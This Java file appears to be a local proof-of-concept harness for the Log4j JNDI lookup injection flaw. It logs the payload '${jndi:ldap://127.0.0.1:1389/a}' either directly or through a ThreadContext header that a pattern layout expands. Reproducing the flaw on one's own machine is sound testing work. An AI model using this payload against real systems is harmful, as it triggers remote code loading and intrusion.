import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.config.builder.api.AppenderComponentBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;

public class Log4j {

    public static void configureLoggerWithThreadContext() {
        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
        builder.setStatusLevel(Level.ERROR);

        AppenderComponentBuilder appenderBuilder = builder.newAppender("Stdout", "CONSOLE").addAttribute("target", ConsoleAppender.Target.SYSTEM_OUT);
        appenderBuilder.add(builder.newLayout("PatternLayout").addAttribute("pattern", "${ctx:header} %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m\n"));

        builder.add(appenderBuilder);
        builder.add(builder.newLogger("org.apache.logging.log4j", Level.DEBUG).add(builder.newAppenderRef("Stdout")).addAttribute("additivity", false));
        builder.add(builder.newRootLogger(Level.ERROR).add(builder.newAppenderRef("Stdout")));
        Configurator.initialize(builder.build());
    }

    public static void main(String[] args) {
        boolean useThreadLocalAttack = false;
        for (int i = 0; i < args.length ; ++i) {
            if (args[i].equalsIgnoreCase("-t")) {
                System.out.println("Will use ThreadContext as attack vector");
                useThreadLocalAttack = true;
            }
        }
        if (useThreadLocalAttack) {
            configureLoggerWithThreadContext();
            Logger logger = LogManager.getLogger();
            ThreadContext.put("header", "${jndi:ldap://127.0.0.1:1389/a}");
            logger.error("Vulnerable through thread context - 1");
            logger.error("Vulnerable through thread context - 2");
        } else {
            Logger logger = LogManager.getLogger();
            // exploit will be executed
            logger.error("${jndi:ldap://127.0.0.1:1389/a}");
            // no more exploits will be executed from here TBD - try with another file
            logger.error("${jndi:ldap://127.0.0.1:1389/a}");
        }
    }
}
